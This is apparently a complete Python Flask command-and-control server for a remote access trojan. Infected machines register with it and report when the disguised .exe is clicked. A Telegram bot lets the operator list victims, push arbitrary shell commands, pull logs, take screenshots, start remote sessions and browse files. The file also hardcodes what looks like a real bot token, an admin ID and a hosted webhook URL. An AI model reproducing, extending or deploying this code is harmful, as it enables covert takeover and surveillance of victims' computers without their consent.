from flask import Flask, request, jsonify
import json
import os
import time
import threading
import requests

app = Flask(__name__)

# ================= CONFIGURATION =================
BOT_TOKEN = "8370598742:AAGtfxRT9rVDOThRavBnq_dFJFSXyHocK1s"  # REPLACE with your bot token
ADMIN_ID = 6586114356       # REPLACE with your numeric user ID
# =================================================

# Data storage
devices = {}
device_lock = threading.Lock()
DATA_FILE = "devices_data.json"
logs = {}

def load_devices():
    global devices
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            devices = json.load(f)

def save_devices():
    with open(DATA_FILE, 'w') as f:
        json.dump(devices, f, indent=2)

def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
    try:
        requests.post(url, json=data, timeout=5)
    except:
        pass

load_devices()

@app.route('/register', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    exe_name = data.get('exe_name')
    computer_info = data.get('computer_info')
    group_id = data.get('group_id')
    
    with device_lock:
        devices[device_id] = {
            'exe_name': exe_name,
            'computer_info': computer_info,
            'last_seen': time.time(),
            'status': 'online',
            'group_id': group_id,
            'pending_command': None
        }
        save_devices()
    
    notification = f"🚨 <b>{exe_name}.exe</b> was clicked on: <code>{computer_info.get('hostname', 'Unknown')}</code> (IP: {computer_info.get('ip', 'N/A')})"
    if group_id:
        send_telegram_message(group_id, notification)
    
    return jsonify({'status': 'registered'})

@app.route('/devices', methods=['GET'])
def get_devices():
    return jsonify(devices)

@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    
    with device_lock:
        if device_id in devices:
            devices[device_id]['pending_command'] = command
            save_devices()
            return jsonify({'status': 'command sent to ' + device_id})
        else:
            return jsonify({'status': 'device not found'}), 404

@app.route('/clear_command', methods=['POST'])
def clear_command():
    data = request.json
    device_id = data.get('device_id')
    with device_lock:
        if device_id in devices:
            devices[device_id]['pending_command'] = None
            save_devices()
    return jsonify({'status': 'cleared'})

@app.route('/log', methods=['POST'])
def receive_log():
    data = request.json
    device_id = data.get('device_id')
    log_content = data.get('log')
    logs[device_id] = log_content
    return jsonify({'status': 'log received'})

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = request.json
    
    if 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '').strip()
        
        if chat_id != ADMIN_ID:
            send_telegram_message(chat_id, "⛔ Unauthorized access denied.")
            return 'OK', 200

        # --- COMMAND: /devices ---
        if text == '/devices':
            if not devices:
                send_telegram_message(chat_id, "📭 No devices are currently connected.")
            else:
                msg = "🖥️ <b>Connected Devices:</b>\n"
                for idx, (device_id, info) in enumerate(devices.items(), 1):
                    exe = info.get('exe_name', 'Unknown')
                    host = info.get('computer_info', {}).get('hostname', 'Unknown')
                    ip = info.get('computer_info', {}).get('ip', 'N/A')
                    status = "🟢 Online" if time.time() - info.get('last_seen', 0) < 60 else "🟡 Inactive"
                    msg += f"{idx}. <code>{device_id}</code> | {exe}.exe | {host} ({ip}) | {status}\n"
                send_telegram_message(chat_id, msg)

        # --- COMMAND: /cmd ---
        elif text.startswith('/cmd'):
            parts = text.split(' ', 2)
            if len(parts) < 3:
                send_telegram_message(chat_id, "⚠️ Usage: /cmd DEVICE_ID \"command\"")
            else:
                device_id = parts[1].strip()
                command = parts[2].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = f"CMD:{command}"
                        save_devices()
                        send_telegram_message(chat_id, f"⌨️ Command <code>{command}</code> sent to <code>{device_id}</code>.")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- COMMAND: /fetchlog ---
        elif text.startswith('/fetchlog'):
            parts = text.split(' ', 1)
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /fetchlog DEVICE_ID")
            else:
                device_id = parts[1].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = "FETCH_LOG"
                        save_devices()
                        send_telegram_message(chat_id, f"📋 Fetching log from <code>{device_id}</code>. Please wait...")
                        time.sleep(5)
                        if device_id in logs and logs[device_id]:
                            log_content = logs[device_id]
                            if len(log_content) > 4000:
                                chunks = [log_content[i:i+4000] for i in range(0, len(log_content), 4000)]
                                for i, chunk in enumerate(chunks, 1):
                                    send_telegram_message(chat_id, f"📄 Log part {i}/{len(chunks)}:\n<pre>{chunk}</pre>")
                            else:
                                send_telegram_message(chat_id, f"📄 Log from <code>{device_id}</code>:\n<pre>{log_content}</pre>")
                        else:
                            send_telegram_message(chat_id, f"⏳ No log received yet from <code>{device_id}</code>. Try again in a few moments.")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- COMMAND: /disconnect ---
        elif text.startswith('/disconnect'):
            parts = text.split(' ', 1)
            if len(parts) < 2:
                send_telegram_message(chat_id, "⚠️ Usage: /disconnect DEVICE_ID")
            else:
                device_id = parts[1].strip()
                with device_lock:
                    if device_id in devices:
                        devices[device_id]['pending_command'] = "CMD:pdagent stop"
                        save_devices()
                        send_telegram_message(chat_id, f"🔌 Disconnecting <code>{device_id}</code>. Device will be free for next user.")
                    else:
                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")

        # --- COMMAND: /help ---
        elif text == '/help':
            help_msg = (
                "🤖 <b>Available Commands:</b>\n\n"
                "/devices - List all connected devices\n"
                "/cmd DEVICE_ID \"command\" - Run any command on device\n"
                "/fetchlog DEVICE_ID - Get debug log from device\n"
                "/disconnect DEVICE_ID - Disconnect device (free it for next user)\n"
                "/help - Show this menu\n\n"
                "<b>Built-in daemon commands:</b>\n"
                "Send these directly to the device's Telegram group:\n"
                "/screenshot - Capture the display\n"
                "/remote - Start remote session\n"
                "/hotkey keys - Send keyboard shortcuts\n"
                "/ls, /cd, /pwd - File system commands\n"
                "/status - Check daemon status\n\n"
                "For a complete list, visit the group where the device is connected."
            )
            send_telegram_message(chat_id, help_msg)

        else:
            send_telegram_message(chat_id, f"❓ Unknown command. Type /help for available commands.")

    return 'OK', 200

@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://dollar-1rtv.onrender.com/webhook/{BOT_TOKEN}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return jsonify(response.json())

@app.route('/')
def home():
    return "✅ PD_Research Final Server is RUNNING and AWAKE!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)